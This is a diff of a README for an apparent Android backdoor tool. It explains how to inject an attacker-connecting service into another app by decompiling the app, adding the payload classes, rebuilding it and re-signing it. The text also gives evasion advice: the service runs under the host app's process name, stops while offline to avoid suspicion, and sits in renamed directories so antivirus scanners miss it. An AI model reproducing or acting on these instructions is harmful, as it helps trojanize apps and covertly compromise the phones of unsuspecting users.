@@ -18,7 +18,10 @@ In this two cases, there is a check about the connection:
 * if the phone is connected, the app tries to make the connection with the attacker and launch a service that retry every X minutes. (Preconfigured at 30 minutes)
 * if it is disconnected and the service has been launched, the app kill this to make no suspects while offline.
 
-**HOW TO**
+**The service will show in the list of all processes with the name of the app you insert the code in.**
+
+
+# HOW TO
 ```
 Modify attacker's host and port in the /app/src/main/java/livingbox/Connect.java(String URL line), decompile the app we want to insert the code, 
 copy all the files in /app/src/main/java/livingbox/ to the original app decompiled folder, in /smali/livingbox (new folder).
@@ -27,6 +30,7 @@ Rebuild the original app and sign it!
 ```
 
 **I've used this directory instead of /stage/metasploit/com/ just because the most of the "antivirus" and malware scanner check this path.**  recommend to modify the "livingbox" directory and the classes file's (also inside them) to not became so prevedible.
+
 
 ## Use it at your own risk
 Tested on Nexus 5, Android 7.1.1
